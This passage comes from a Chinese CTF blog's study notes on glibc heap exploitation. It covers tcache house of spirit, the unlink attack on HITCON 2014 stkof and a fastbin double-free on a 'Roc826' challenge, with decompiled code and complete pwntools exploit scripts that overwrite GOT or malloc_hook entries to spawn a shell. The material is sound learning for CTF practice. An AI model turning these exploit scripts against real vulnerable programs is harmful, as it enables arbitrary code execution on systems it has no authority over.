+hex(realloc_hook))</span><br><span class="line"></span><br><span class="line">edit(4,&#39;\x07&#39;*64+p64(malloc_hook-0x8))</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">add(0x10) #5</span><br><span class="line">edit(5,p64(one_gadget)+p64(realloc+8))</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">add(0x20)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="tcache-house-of-spirit"><a href="#tcache-house-of-spirit" class="headerlink" title="tcache house of spirit"></a>tcache house of spirit</h3><p>与house of spirit的利用方式几乎相同(详见House of Spirit)，但是由于<code>tcache_put</code>函数几乎没有检查，因此构造fake tcache chunk内存时需要绕过的检查更加宽松，具体如下：</p>
<ol>
<li>fake chunk的size在tcache的范围中（64位程序中是32字节到410字节），且其ISMMAP位不为1</li>
<li>fake chunk的地址对齐</li>
</ol>
<p>这里不需要构造next chunk的size，也不需要考虑double free的情况，因为free堆块到tcache中的时候不会进行这些检查。</p>
<h3 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h3><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/tcache_attack-zh/" target="_blank" rel="noopener external nofollow noreferrer">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/tcache_attack-zh/</a></p>
<p><a href="https://noonegroup.xyz/posts/f37fbe7f/" target="_blank" rel="noopener external nofollow noreferrer">https://noonegroup.xyz/posts/f37fbe7f/</a></p>
<p><a href="https://noonegroup.xyz/posts/63c0a3ee/" target="_blank" rel="noopener external nofollow noreferrer">https://noonegroup.xyz/posts/63c0a3ee/</a></p>
<p><a href="https://www.cnblogs.com/Theffth-blog/p/12790720.html" target="_blank" rel="noopener external nofollow noreferrer">https://www.cnblogs.com/Theffth-blog/p/12790720.html</a></p>
]]></content>
      <categories>
        <category>heap</category>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>heap</tag>
        <tag>Tcache</tag>
      </tags>
  </entry>
  <entry>
    <title>Unlink Attack</title>
    <url>/2020/05/22/unlink/</url>
    <content><![CDATA[<p><img src="https://i.loli.net/2020/09/29/iMO5rza8ECVkZut.jpg" alt="alt"></p>
<a id="more"></a>

<h3 id="学习笔记"><a href="#学习笔记" class="headerlink" title="学习笔记"></a>学习笔记</h3><p>最近学习了unlink知识，然后将自己对unlink的理解写了下来，本来应该早就开始写的，但是本人太懒了，一直拖到现在才开始。</p>
<h3 id="unlink原理"><a href="#unlink原理" class="headerlink" title="unlink原理"></a>unlink原理</h3><p>关于unlink原理在WIKI上有很详细的讲解，我这里说一下自己的理解。</p>
<p>当申请的chunk不属于fastbin的时候，free该chunk的时候，会检查该chunk的物理相邻低位chunk和高位chunk进行向后合并和向前合并。</p>
<h3 id="unlink执行过程"><a href="#unlink执行过程" class="headerlink" title="unlink执行过程"></a>unlink执行过程</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FD&#x3D;P-&gt;fd &#x3D; target addr -0x18</span><br><span class="line">BK&#x3D;P-&gt;bk &#x3D; expect value</span><br><span class="line">FD-&gt;bk &#x3D; BK，即 *(target addr-0x18+0x18)&#x3D;BK&#x3D;expect value</span><br><span class="line">BK-&gt;fd &#x3D; FD，即 *(expect value +0x10) &#x3D; FD &#x3D; target addr-0x18</span><br></pre></td></tr></table></figure>

<p>在远古时期，只要我们将fd和bk伪造成这样，在unlink的时候我们就可以实现任一地址写了，但是因为加了检查，现实就变的很残酷了。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; fd bk</span><br><span class="line">if (__builtin_expect (FD-&gt;bk !&#x3D; P || BK-&gt;fd !&#x3D; P, 0))                      \</span><br><span class="line">  malloc_printerr (check_action, &quot;corrupted double-linked list&quot;, P, AV);  \</span><br></pre></td></tr></table></figure>

<p>那么如何绕过检查呢！！！</p>
<p>只要我们将fd修改为<code>P-0x18</code>,bk修改为<code>P-0x10</code>就可以绕过检查了。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FD&#x3D;P-&gt;fd &#x3D; P-0x18</span><br><span class="line">BK&#x3D;P-&gt;bk &#x3D; p-0x10</span><br><span class="line">FD-&gt;bk &#x3D; BK，即 *(P-0x18+0x18)&#x3D;BK&#x3D;P-0x10</span><br><span class="line">BK-&gt;fd &#x3D; FD，即 *(P-0x10 +0x10) &#x3D; FD &#x3D; P-0x18</span><br></pre></td></tr></table></figure>

<p>这样我们就可以在P这个chunk的地址上写成<code>P-0x18</code>了。</p>
<h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><ul>
<li>UAF ，可修改 free 状态下 smallbin 或是 unsorted bin 的 fd 和 bk 指针</li>
<li>已知位置存在一个指针指向可进行 UAF 的 chunk</li>
</ul>
<p>这里以一道例题来演示一下。</p>
<h3 id="2014-HITCON-stkof"><a href="#2014-HITCON-stkof" class="headerlink" title="2014 HITCON stkof"></a>2014 HITCON stkof</h3><h4 id="checksec检查"><a href="#checksec检查" class="headerlink" title="checksec检查"></a>checksec检查</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<h4 id="main函数如下："><a href="#main函数如下：" class="headerlink" title="main函数如下："></a>main函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">_int64 __fastcall main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  int v3; &#x2F;&#x2F; eax@2</span><br><span class="line">  __int64 result; &#x2F;&#x2F; rax@19</span><br><span class="line">  __int64 v5; &#x2F;&#x2F; rcx@19</span><br><span class="line">  signed int v6; &#x2F;&#x2F; [sp+Ch] [bp-74h]@9</span><br><span class="line">  char nptr; &#x2F;&#x2F; [sp+10h] [bp-70h]@2</span><br><span class="line">  __int64 v8; &#x2F;&#x2F; [sp+78h] [bp-8h]@1</span><br><span class="line"></span><br><span class="line">  v8 &#x3D; *MK_FP(__FS__, 40LL);</span><br><span class="line">  alarm(0x78u);</span><br><span class="line">  while ( fgets(&amp;nptr, 10, stdin) )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 &#x3D; atoi(&amp;nptr);</span><br><span class="line">    if ( v3 &#x3D;&#x3D; 2 )</span><br><span class="line">    &#123;</span><br><span class="line">      v6 &#x3D; edit();</span><br><span class="line">      goto LABEL_14;</span><br><span class="line">    &#125;</span><br><span class="line">    if ( v3 &gt; 2 )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( v3 &#x3D;&#x3D; 3 )</span><br><span class="line">      &#123;</span><br><span class="line">        v6 &#x3D; free_();</span><br><span class="line">        goto LABEL_14;</span><br><span class="line">      &#125;</span><br><span class="line">      if ( v3 &#x3D;&#x3D; 4 )</span><br><span class="line">      &#123;</span><br><span class="line">        v6 &#x3D; sub_400BA9();</span><br><span class="line">        goto LABEL_14;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else if ( v3 &#x3D;&#x3D; 1 )</span><br><span class="line">    &#123;</span><br><span class="line">      v6 &#x3D; add();</span><br><span class="line">      goto LABEL_14;</span><br><span class="line">    &#125;</span><br><span class="line">    v6 &#x3D; -1;</span><br><span class="line">LABEL_14:</span><br><span class="line">    if ( v6 )</span><br><span class="line">      puts(&quot;FAIL&quot;);</span><br><span class="line">    else</span><br><span class="line">      puts(&quot;OK&quot;);</span><br><span class="line">    fflush(stdout);</span><br><span class="line">  &#125;</span><br><span class="line">  result &#x3D; 0LL;</span><br><span class="line">  v5 &#x3D; *MK_FP(__FS__, 40LL) ^ v8;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="add函数如下："><a href="#add函数如下：" class="headerlink" title="add函数如下："></a>add函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">signed __int64 add()</span><br><span class="line">&#123;</span><br><span class="line">  signed __int64 result; &#x2F;&#x2F; rax@2</span><br><span class="line">  __int64 v1; &#x2F;&#x2F; rcx@4</span><br><span class="line">  __int64 size; &#x2F;&#x2F; [sp+0h] [bp-80h]@1</span><br><span class="line">  void *v3; &#x2F;&#x2F; [sp+8h] [bp-78h]@1</span><br><span class="line">  char s; &#x2F;&#x2F; [sp+10h] [bp-70h]@1</span><br><span class="line">  __int64 v5; &#x2F;&#x2F; [sp+78h] [bp-8h]@1</span><br><span class="line"></span><br><span class="line">  v5 &#x3D; *MK_FP(__FS__, 40LL);</span><br><span class="line">  fgets(&amp;s, 16, stdin);</span><br><span class="line">  size &#x3D; atoll(&amp;s);</span><br><span class="line">  v3 &#x3D; malloc(size);</span><br><span class="line">  if ( v3 )</span><br><span class="line">  &#123;</span><br><span class="line">    *&amp;::s[8 * ++dword_602100] &#x3D; v3;</span><br><span class="line">    printf(&quot;%d\n&quot;, dword_602100, size);</span><br><span class="line">    result &#x3D; 0LL;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    result &#x3D; 0xFFFFFFFFLL;</span><br><span class="line">  &#125;</span><br><span class="line">  v1 &#x3D; *MK_FP(__FS__, 40LL) ^ v5;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="edit函数如下："><a href="#edit函数如下：" class="headerlink" title="edit函数如下："></a>edit函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">signed __int64 edit()</span><br><span class="line">&#123;</span><br><span class="line">  signed __int64 result; &#x2F;&#x2F; rax@2</span><br><span class="line">  int i; &#x2F;&#x2F; eax@5</span><br><span class="line">  __int64 v2; &#x2F;&#x2F; rcx@11</span><br><span class="line">  unsigned int v3; &#x2F;&#x2F; [sp+8h] [bp-88h]@1</span><br><span class="line">  __int64 n; &#x2F;&#x2F; [sp+10h] [bp-80h]@5</span><br><span class="line">  char *ptr; &#x2F;&#x2F; [sp+18h] [bp-78h]@5</span><br><span class="line">  char index; &#x2F;&#x2F; [sp+20h] [bp-70h]@1</span><br><span class="line">  __int64 v7; &#x2F;&#x2F; [sp+88h] [bp-8h]@1</span><br><span class="line"></span><br><span class="line">  v7 &#x3D; *MK_FP(__FS__, 40LL);</span><br><span class="line">  fgets(&amp;index, 16, stdin);</span><br><span class="line">  v3 &#x3D; atol(&amp;index);</span><br><span class="line">  if ( v3 &lt;&#x3D; 0x100000 )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( *&amp;s[8 * v3] )</span><br><span class="line">    &#123;</span><br><span class="line">      fgets(&amp;index, 16, stdin);</span><br><span class="line">      n &#x3D; atoll(&amp;index);                        &#x2F;&#x2F; size</span><br><span class="line">      ptr &#x3D; *&amp;s[8 * v3];</span><br><span class="line">      for ( i &#x3D; fread(ptr, 1uLL, n, stdin); i &gt; 0; i &#x3D; fread(ptr, 1uLL, n, stdin) )&#x2F;&#x2F; 堆溢出</span><br><span class="line">      &#123;</span><br><span class="line">        ptr +&#x3D; i;</span><br><span class="line">        n -&#x3D; i;</span><br><span class="line">      &#125;</span><br><span class="line">      if ( n )</span><br><span class="line">        result &#x3D; 0xFFFFFFFFLL;</span><br><span class="line">      else</span><br><span class="line">        result &#x3D; 0LL;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      result &#x3D; 0xFFFFFFFFLL;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    result &#x3D; 0xFFFFFFFFLL;</span><br><span class="line">  &#125;</span><br><span class="line">  v2 &#x3D; *MK_FP(__FS__, 40LL) ^ v7;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="free函数如下："><a href="#free函数如下：" class="headerlink" title="free函数如下："></a>free函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">signed __int64 free_()</span><br><span class="line">&#123;</span><br><span class="line">  signed __int64 result; &#x2F;&#x2F; rax@2</span><br><span class="line">  __int64 v1; &#x2F;&#x2F; rcx@6</span><br><span class="line">  unsigned int v2; &#x2F;&#x2F; [sp+Ch] [bp-74h]@1</span><br><span class="line">  char index; &#x2F;&#x2F; [sp+10h] [bp-70h]@1</span><br><span class="line">  __int64 v4; &#x2F;&#x2F; [sp+78h] [bp-8h]@1</span><br><span class="line"></span><br><span class="line">  v4 &#x3D; *MK_FP(__FS__, 40LL);</span><br><span class="line">  fgets(&amp;index, 16, stdin);</span><br><span class="line">  v2 &#x3D; atol(&amp;index);</span><br><span class="line">  if ( v2 &lt;&#x3D; 0x100000 )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( *&amp;s[8 * v2] )</span><br><span class="line">    &#123;</span><br><span class="line">      free(*&amp;s[8 * v2]);</span><br><span class="line">      *&amp;s[8 * v2] &#x3D; 0LL;</span><br><span class="line">      result &#x3D; 0LL;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      result &#x3D; 0xFFFFFFFFLL;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    result &#x3D; 0xFFFFFFFFLL;</span><br><span class="line">  &#125;</span><br><span class="line">  v1 &#x3D; *MK_FP(__FS__, 40LL) ^ v4;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在edit函数中有非常严重的堆溢出漏洞，在bss段有一个用来存放堆指针的数组，这样就满足了unlink的利用条件。</p>
<h4 id="利用思路："><a href="#利用思路：" class="headerlink" title="利用思路："></a>利用思路：</h4><ol>
<li>申请4个chunk，4个chunk大小分别是0x20,0x30,0x80,0x20,然后通过堆溢出修改chunk3触发unlink，这样原本chunk2的堆指针就被我们修改为chunk2-0x18了。</li>
<li>然后我们通过edit函数将chunk1和chunk3的堆指针修改为free_got和puts_got，然后再将free_got修改为puts_plt，来泄露libc</li>
<li>然后将free_got修改为system_addr，将chunk4的内容修改为<code>/bin/sh\x00</code>，然后free掉chunk4来getshell。</li>
</ol>
<h4 id="exp如下："><a href="#exp如下：" class="headerlink" title="exp如下："></a>exp如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh&#x3D;process(&#39;.&#x2F;stkof&#39;)</span><br><span class="line">elf&#x3D;ELF(&#39;.&#x2F;stkof&#39;)</span><br><span class="line">libc&#x3D;elf.libc</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line">free_got&#x3D;elf.got[&#39;free&#39;]</span><br><span class="line">puts_got&#x3D;elf.got[&#39;puts&#39;]</span><br><span class="line">puts_plt&#x3D;elf.plt[&#39;puts&#39;]</span><br><span class="line"></span><br><span class="line">def add(size) :</span><br><span class="line">    sh.sendline(&quot;1&quot;)</span><br><span class="line">    sh.sendline(str(size))</span><br><span class="line">    sh.recvuntil(&quot;OK\n&quot;)</span><br><span class="line"></span><br><span class="line">def edit(idx,strings):</span><br><span class="line">    sh.sendline(&quot;2&quot;)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line">    sh.sendline(str(len(strings)))</span><br><span class="line">    sh.send(strings)</span><br><span class="line">    sh.recvuntil(&quot;OK\n&quot;)</span><br><span class="line"></span><br><span class="line">def free(idx):</span><br><span class="line">    sh.sendline(&quot;3&quot;)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">add(0x20) #1</span><br><span class="line">add(0x30) #2</span><br><span class="line">add(0x80) #3</span><br><span class="line">add(0x20) #4</span><br><span class="line"></span><br><span class="line">target&#x3D;0x602150</span><br><span class="line">fd&#x3D;target-0x18</span><br><span class="line">bk&#x3D;target-0x10</span><br><span class="line"></span><br><span class="line">edit(2,p64(0)+p64(0x30)+p64(fd)+p64(bk)+&#39;a&#39;*0x10+p64(0x30)+p64(0x90))</span><br><span class="line">free(3)</span><br><span class="line"></span><br><span class="line">edit(2,&#39;a&#39;*0x10+p64(free_got)+p64(puts_got))</span><br><span class="line">edit(1,p64(puts_plt))</span><br><span class="line">free(2)</span><br><span class="line">sh.recvuntil(&#39;OK\n&#39;)</span><br><span class="line">puts_addr&#x3D;u64(sh.recv(6).ljust(8,&#39;\x00&#39;))</span><br><span class="line">log.success(&#39;puts_addr: &#39; +hex(puts_addr))</span><br><span class="line"></span><br><span class="line">libc_base&#x3D;puts_addr-libc.symbols[&#39;puts&#39;]</span><br><span class="line">log.success(&#39;libc_base: &#39; +hex(libc_base))</span><br><span class="line">system_addr&#x3D;libc_base+libc.symbols[&#39;system&#39;]</span><br><span class="line">log.success(&#39;system_addr: &#39; +hex(system_addr))</span><br><span class="line"></span><br><span class="line">edit(1,p64(system_addr))</span><br><span class="line">edit(4,&#39;&#x2F;bin&#x2F;sh\x00&#39;)</span><br><span class="line">free(4)</span><br><span class="line"></span><br><span class="line">#gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<p>参考链接：</p>
<p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unlink-zh/#_1" target="_blank" rel="noopener external nofollow noreferrer">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unlink-zh/#_1</a></p>
<p><a href="https://bbs.pediy.com/thread-247007.htm" target="_blank" rel="noopener external nofollow noreferrer">https://bbs.pediy.com/thread-247007.htm</a></p>
]]></content>
      <categories>
        <category>heap</category>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>heap</tag>
        <tag>unlink</tag>
      </tags>
  </entry>
  <entry>
    <title>Fastbin Attack</title>
    <url>/2020/05/18/fastbin-attack/</url>
    <content><![CDATA[<p><img src="https://i.loli.net/2020/09/29/ytANlTwxSo7mrpX.jpg" alt="alt"></p>
<a id="more"></a>

<h2 id="学习心得"><a href="#学习心得" class="headerlink" title="学习心得"></a>学习心得</h2><p>最近学习了关于fastbin_attack相关的利用方法，明白了关于fastbin原来有这么多利用方法，深刻体会到了自己是有多么的菜。下面就是关于我自己整理的一些利用漏洞的心得。</p>
<h2 id="介绍-CTF-WIKI"><a href="#介绍-CTF-WIKI" class="headerlink" title="介绍(CTF WIKI)"></a>介绍(CTF WIKI)</h2><p>fastbin attack 是一类漏洞的利用方法，是指所有基于 fastbin 机制的漏洞利用方法。这类利用的前提是：</p>
<ul>
<li>存在堆溢出、use-after-free 等能控制 chunk 内容的漏洞</li>
<li>漏洞发生于 fastbin 类型的 chunk 中</li>
</ul>
<p>如果细分的话，可以做如下的分类：</p>
<ul>
<li>Fastbin Double Free</li>
<li>House of Spirit</li>
<li>Alloc to Stack</li>
<li>Arbitrary Alloc</li>
</ul>
<p>其中，前两种主要漏洞侧重于利用 <code>free</code> 函数释放真的 chunk 或伪造的 chunk，然后再次申请 chunk 进行攻击，后两种侧重于故意修改 <code>fd</code> 指针，直接利用 <code>malloc</code> 申请指定位置 chunk 进行攻击。</p>
<h2 id="Fastbin-Double-Free"><a href="#Fastbin-Double-Free" class="headerlink" title="Fastbin Double Free"></a>Fastbin Double Free</h2><h3 id="利用原理："><a href="#利用原理：" class="headerlink" title="利用原理："></a>利用原理：</h3><ul>
<li>fastbin在free的时候不会检查链表后面的chunk</li>
<li>fastbin 的堆块被释放后 next_chunk 的 pre_inuse 位不会被清空</li>
</ul>
<h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><ul>
<li>free时候没有将free后的指针置空</li>
</ul>
<p>这里做一道例题来演示一下</p>
<h3 id="Roc826"><a href="#Roc826" class="headerlink" title="Roc826"></a>Roc826</h3><h4 id="checksec检查："><a href="#checksec检查：" class="headerlink" title="checksec检查："></a>checksec检查：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<h4 id="main函数如下："><a href="#main函数如下：" class="headerlink" title="main函数如下："></a>main函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int __cdecl __noreturn main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  int v3; &#x2F;&#x2F; eax@2</span><br><span class="line"></span><br><span class="line">  setbuf(stdin, 0LL);</span><br><span class="line">  setbuf(_bss_start, 0LL);</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    while ( 1 )</span><br><span class="line">    &#123;</span><br><span class="line">      while ( 1 )</span><br><span class="line">      &#123;</span><br><span class="line">        menu();</span><br><span class="line">        v3 &#x3D; readi();</span><br><span class="line">        if ( v3 !&#x3D; 2 )</span><br><span class="line">          break;</span><br><span class="line">        dele();</span><br><span class="line">      &#125;</span><br><span class="line">      if ( v3 &gt; 2 )</span><br><span class="line">        break;</span><br><span class="line">      if ( v3 !&#x3D; 1 )</span><br><span class="line">        goto LABEL_13;</span><br><span class="line">      add();</span><br><span class="line">    &#125;</span><br><span class="line">    if ( v3 !&#x3D; 3 )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( v3 &#x3D;&#x3D; 4 )</span><br><span class="line">        exit(0);</span><br><span class="line">LABEL_13:</span><br><span class="line">      exit(0);</span><br><span class="line">    &#125;</span><br><span class="line">    show();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="add函数如下："><a href="#add函数如下：" class="headerlink" title="add函数如下："></a>add函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">__int64 add()</span><br><span class="line">&#123;</span><br><span class="line">  signed int i; &#x2F;&#x2F; [sp+8h] [bp-8h]@1</span><br><span class="line">  int v2; &#x2F;&#x2F; [sp+Ch] [bp-4h]@3</span><br><span class="line"></span><br><span class="line">  for ( i &#x3D; 0; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( i &gt; 19 )</span><br><span class="line">    &#123;</span><br><span class="line">      puts(&quot;full!&quot;);</span><br><span class="line">      return 0LL;</span><br><span class="line">    &#125;</span><br><span class="line">    if ( !*(_QWORD *)&amp;list[8 * i] )</span><br><span class="line">      break;</span><br><span class="line">  &#125;</span><br><span class="line">  puts(&quot;size?&quot;);</span><br><span class="line">  v2 &#x3D; readi();</span><br><span class="line">  if ( v2 &lt; 0 || v2 &gt; 144 )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Invalid size!&quot;);</span><br><span class="line">    exit(0);</span><br><span class="line">  &#125;</span><br><span class="line">  *(_QWORD *)&amp;list[8 * i] &#x3D; malloc(v2);</span><br><span class="line">  printf(&quot;content:&quot;);</span><br><span class="line">  read_n(*(_QWORD *)&amp;list[8 * i], (unsigned int)v2);</span><br><span class="line">  puts(&quot;done!&quot;);</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="show函数如下："><a href="#show函数如下：" class="headerlink" title="show函数如下："></a>show函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">__int64 show()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; &#x2F;&#x2F; [sp+Ch] [bp-4h]@1</span><br><span class="line"></span><br><span class="line">  puts(&quot;index?&quot;);</span><br><span class="line">  v1 &#x3D; readi();</span><br><span class="line">  if ( *(_QWORD *)&amp;list[8 * v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    printf(&quot;content:&quot;);</span><br><span class="line">    puts(*(const char **)&amp;list[8 * v1]);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Invalid index!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="dele函数如下："><a href="#dele函数如下：" class="headerlink" title="dele函数如下："></a>dele函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">__int64 dele()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; &#x2F;&#x2F; [sp+Ch] [bp-4h]@1</span><br><span class="line"></span><br><span class="line">  puts(&quot;index?&quot;);</span><br><span class="line">  v1 &#x3D; readi();</span><br><span class="line">  if ( *(_QWORD *)&amp;list[8 * v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    free(*(void **)&amp;list[8 * v1]);</span><br><span class="line">    puts(&quot;done!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Invalid index!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到在dele函数中存在很明显的漏洞，free后没有将指针置空，而且show函数中只会检查该chunk的指针是否置空。</p>
<h4 id="利用思路："><a href="#利用思路：" class="headerlink" title="利用思路："></a>利用思路：</h4><ol>
<li><p>申请unsorted bin大小的chunk，free掉后，fd和bk中会有<code>main_arena</code>地址，然后利用show函数泄露其中地址。</p>
</li>
<li><p>利用double free漏洞，在fastbin中造成类似于<code>chunk1--&gt;chunk2--&gt;chunk1</code>这样的链表，然后申请chunk1并且修改fd为free_got地址附近，这里要注意伪造size，这里我找的是0x601ffa这个地址。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x&#x2F;10gx 0x601ffa</span><br><span class="line">0x601ffa:	0x1e28000000000000	0xe168000000000060    &lt;----fake_size</span><br><span class="line">0x60200a:	0xeee000007ffff7ff	0x14f000007ffff7de     free_got地址是0x602018</span><br><span class="line">0x60201a:	0xe29000007ffff7a9	0xc69000007ffff7a7</span><br><span class="line">0x60202a:	0x06c600007ffff7a7	0x36b0000000000040</span><br><span class="line">0x60203a:	0x280000007ffff7a8	0x425000007ffff7a6</span><br></pre></td></tr></table></figure>
</li>
<li><p>然后连续malloc拿到这个地址，将free_got地址的内容修改为system地址，然后将之前输入带有<code>/bin/sh\x00</code>的chunk释放掉，就可以getshell了。这里也可以将chunk伪造到<code>malloc_hook</code>附近，将<code>one_gadget</code>写入<code>malloc_hook</code>。</p>
</li>
</ol>
<h4 id="exp如下："><a href="#exp如下：" class="headerlink" title="exp如下："></a>exp如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh&#x3D;process(&#39;.&#x2F;Roc826&#39;)</span><br><span class="line">elf&#x3D;ELF(&#39;.&#x2F;Roc826&#39;)</span><br><span class="line">libc&#x3D;elf.libc</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line"></span><br><span class="line">def add(size,content) :</span><br><span class="line">	sh.recvuntil(&#39;:&#39;)</span><br><span class="line">	sh.sendline(&#39;1&#39;)</span><br><span class="line">	sh.recvuntil(&#39;\n&#39;)</span><br><span class="line">	sh.sendline(str(size))</span><br><span class="line">	sh.recvuntil(&#39;:&#39;)</span><br><span class="line">	sh.sendline(content)</span><br><span class="line"></span><br><span class="line">def show(index) :</span><br><span class="line">        sh.recvuntil(&#39;:&#39;)</span><br><span class="line">        sh.sendline(&#39;3&#39;)</span><br><span class="line">        sh.recvuntil(&#39;?\n&#39;)</span><br><span class="line">        sh.sendline(str(index))</span><br><span class="line"></span><br><span class="line">def free(index) :</span><br><span class="line">        sh.recvuntil(&#39;:&#39;)</span><br><span class="line">        sh.sendline(&#39;2&#39;)</span><br><span class="line">        sh.recvuntil(&#39;\n&#39;)</span><br><span class="line">        sh.sendline(str(index))</span><br><span class="line"></span><br><span class="line">add(0x80,&#39;L0ne1y&#39;) #0</span><br><span class="line">add(0x50,&#39;L0ne1y&#39;) #1</span><br><span class="line">add(0x50,&#39;L0ne1y&#39;) #2</span><br><span class="line">add(0x50,&#39;&#x2F;bin&#x2F;sh\x00&#39;) #3</span><br><span class="line">free(0)</span><br><span class="line">show(0)</span><br><span class="line">sh.recvuntil(&#39;content:&#39;)</span><br><span class="line">main_arena&#x3D;u64(sh.recv(6).ljust(8,&#39;\x00&#39;))</span><br><span class="line">print(&#39;main_arena:&#39; +hex(main_arena))</span><br><span class="line">libc_base&#x3D;main_arena-libc.symbols[&#39;__malloc_hook&#39;]-0x68</span><br><span class="line">print(&#39;libc_base:&#39; +hex(libc_base))</span><br><span class="line">system_addr&#x3D;libc_base+libc.symbols[&#39;system&#39;]</span><br><span class="line">print (&#39;system_addr:&#39; +hex(system_addr))</span><br><span class="line"></span><br><span class="line">free(1)</span><br><span class="line">free(2)</span><br><span class="line">free(1)  # 1-&gt;2&lt;-&gt;1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(0x50,p64(0x601ffa))</span><br><span class="line"></span><br><span class="line">add(0x50,&#39;L0ne1y&#39;)</span><br><span class="line">add(0x50,&#39;L0ne1y&#39;)</span><br><span class="line">add(0x50,&#39;a&#39;*14+p64(system_addr)[:6])</span><br><span class="line"></span><br><span class="line">free(3)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

